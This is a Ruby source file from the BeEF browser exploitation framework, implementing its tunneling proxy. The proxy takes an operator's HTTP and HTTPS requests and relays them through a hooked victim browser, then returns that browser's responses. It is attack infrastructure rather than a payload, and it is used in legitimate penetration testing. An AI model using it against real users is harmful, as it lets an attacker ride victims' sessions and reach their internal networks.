#
# Copyright (c) 2006-2023 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
require 'openssl'

module BeEF
  module Extension
    module Proxy
      class Proxy
        HB = BeEF::Core::Models::HookedBrowser
        H = BeEF::Core::Models::Http
        @response = nil

        # Multi-threaded Tunneling Proxy: listens on host:port configured in extensions/proxy/config.yaml
        # and forwards requests to the hooked browser using the Requester component.
        def initialize
          @conf = BeEF::Core::Configuration.instance
          @proxy_server = TCPServer.new(@conf.get('beef.extension.proxy.address'), @conf.get('beef.extension.proxy.port'))

          # setup proxy for SSL/TLS
          ssl_context = OpenSSL::SSL::SSLContext.new
          # ssl_context.ssl_version = :TLSv1_2

          # load certificate
          begin
            cert_file = @conf.get('beef.extension.proxy.cert')
            cert = File.read(cert_file)
            ssl_context.cert = OpenSSL::X509::Certificate.new(cert)
          rescue StandardError
            print_error "[Proxy] Could not load SSL certificate '#{cert_file}'"
          end

          # load key
          begin
            key_file = @conf.get('beef.extension.proxy.key')
            key = File.read(key_file)
            ssl_context.key = OpenSSL::PKey::RSA.new(key)
          rescue StandardError
            print_error "[Proxy] Could not load SSL key '#{key_file}'"
          end

          ssl_server = OpenSSL::SSL::SSLServer.new(@proxy_server, ssl_context)
          ssl_server.start_immediately = false

          loop do
            ssl_socket = ssl_server.accept
            Thread.new ssl_socket, &method(:handle_request)
          end
        end

        def handle_request(socket)
          request_line = socket.readline

          # HTTP method # defaults to GET
          method = request_line[/^\w+/]

          # Handle SSL requests
          url_prefix = ''
          if method == 'CONNECT'
            # request_line is something like:
            # CONNECT example.com:443 HTTP/1.1
            host_port = request_line.split[1]
            proto = 'https'
            url_prefix = "#{proto}://#{host_port}"
            loop do
              line = socket.readline
              break if line.strip.empty?
            end
            socket.puts("HTTP/1.0 200 Connection established\r\n\r\n")
            socket.accept
            print_debug("[PROXY] Handled CONNECT to #{host_port}")
            request_line = socket.readline
          end

          method, _path, version = request_line.split

          # HTTP scheme/protocol # defaults to http
          proto = 'http' unless proto.eql?('https')

          # HTTP version # defaults to 1.0
          version = 'HTTP/1.0' if version !~ %r{\AHTTP/\d\.\d\z}

          # HTTP request path
          path = request_line[/^\w+\s+(\S+)/, 1]

          # url # proto://host:port + path
          url = url_prefix + path

          # We're overwriting the URI::Parser UNRESERVED regex to prevent BAD URI errors
          # when sending attack vectors (see tolerant_parser)
          # anti: somehow the config below was removed, have a look into this
          tolerant_parser = URI::Parser.new(UNRESERVED: BeEF::Core::Configuration.instance.get('beef.extension.requester.uri_unreserved_chars'))
          uri = tolerant_parser.parse(url.to_s)

          uri_path_and_qs = uri.query.nil? ? uri.path : "#{uri.path}?#{uri.query}"

          # extensions/requester/api/hook.rb parses raw_request to find port and path
          raw_request = "#{[method, uri_path_and_qs, version].join(' ')}\r\n"
          content_length = 0

          loop do
            line = socket.readline

            content_length = Regexp.last_match(1).to_i if line =~ /^Content-Length:\s+(\d+)\s*$/

            if line.strip.empty?
              # read data still in the socket, exactly <content_length> bytes
              raw_request += "\r\n#{socket.read(content_length)}" if content_length >= 0
              break
            else
              raw_request += line
            end
          end

          # Saves the new HTTP request to the db. It will be processed by the PreHookCallback of the requester component.
          # IDs are created and incremented automatically by DataMapper.
          http = H.new(
            request: raw_request,
            method: method,
            proto: proto,
            domain: uri.host,
            port: uri.port,
            path: uri_path_and_qs,
            request_date: Time.now,
            hooked_browser_id: get_tunneling_proxy,
            allow_cross_domain: 'true'
          )
          http.save
          print_debug(
            "[PROXY] --> Forwarding request ##{http.id}: " \
            "domain[#{http.domain}:#{http.port}], " \
            "method[#{http.method}], " \
            "path[#{http.path}], " \
            "cross domain[#{http.allow_cross_domain}]"
          )

          # Wait for the HTTP response to be stored in the db.
          # TODO: re-implement this with EventMachine or with the Observer pattern.
          sleep 0.5 while H.find(http.id).has_ran != 'complete'
          @response = H.find(http.id)
          print_debug "[PROXY] <-- Response for request ##{@response.id} to [#{@response.path}] on domain [#{@response.domain}:#{@response.port}] correctly processed"

          response_body = @response['response_data']
          response_status = @response['response_status_code']
          headers = @response['response_headers']

          # The following is needed to forward back some of the original HTTP response headers obtained via XHR calls.
          # Original XHR response headers are stored in extension_requester_http table (response_headers column),
          # but we are forwarding back only some of them (Server, X-.. - like X-Powered-By -, Content-Type, ... ).
          # Some of the original response headers need to be removed, like encoding and cache related: for example
          # about encoding, the original response headers says that the content-length is 1000 as the response is gzipped,
          # but the final content-length forwarded back by the proxy is clearly bigger. Date header follows the same way.
          response_headers = ''
          if response_status != -1 && response_status != 0
            ignore_headers = %w[
              Content-Encoding
              Keep-Alive
              Cache-Control
              Vary
              Pragma
              Connection
              Expires
              Accept-Ranges
              Transfer-Encoding
              Date
            ]
            headers.each_line do |line|
              # stripping the Encoding, Cache and other headers
              header_key = line.split(': ')[0]
              header_value = line.split(': ')[1]
              next if header_key.nil?
              next if ignore_headers.any? { |h| h.casecmp(header_key).zero? }

              # ignore headers with no value (@todo: why?)
              next if header_value.nil?

              unless header_key == 'Content-Length'
                response_headers += line
                next
              end

              # update Content-Length with the valid one
              response_headers += "Content-Length: #{response_body.size}\r\n"
            end
          end

          res = "#{version} #{response_status}\r\n#{response_headers}\r\n#{response_body}"
          socket.write(res)
          socket.close
        end

        def get_tunneling_proxy
          proxy_browser = HB.where(is_proxy: true).first
          return proxy_browser.session.to_s unless proxy_browser.nil?

          hooked_browser = HB.first
          unless hooked_browser.nil?
            print_debug "[Proxy] Proxy browser not set. Defaulting to first hooked browser [id: #{hooked_browser.session}]"
            return hooked_browser.session
          end

          print_error '[Proxy] No hooked browsers'
          nil
        end
      end
    end
  end
end
